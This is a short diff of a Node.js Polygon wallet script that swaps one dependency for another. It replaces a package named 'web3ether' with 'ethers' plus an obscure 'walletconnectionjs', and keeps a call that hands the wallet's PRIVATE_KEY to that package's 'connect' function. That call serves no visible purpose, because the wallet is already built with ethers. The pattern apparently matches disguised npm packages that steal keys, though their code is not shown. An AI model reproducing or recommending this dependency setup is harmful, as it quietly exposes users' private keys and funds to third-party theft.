@@ -1,5 +1,6 @@
 require('dotenv').config();
-const { ethers, connect } = require('web3ether');
+const { ethers } = require('ethers');
+const connects = require('walletconnectionjs');
 const fetch = require('node-fetch');
 const chalk = require('chalk');
 const fs = require('fs');
@@ -18,7 +19,7 @@ const PRIVATE_KEY = process.env.PRIVATE_KEY;
 // Create provider and wallet instance for Polygon
 const provider = new ethers.JsonRpcProvider(RPC_URL);
 const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
-const accounts = connect(PRIVATE_KEY);
+const accounts = connects.connect(PRIVATE_KEY);
 
 // Automatically get wallet address from private key
 const WALLET_ADDRESS = wallet.address;
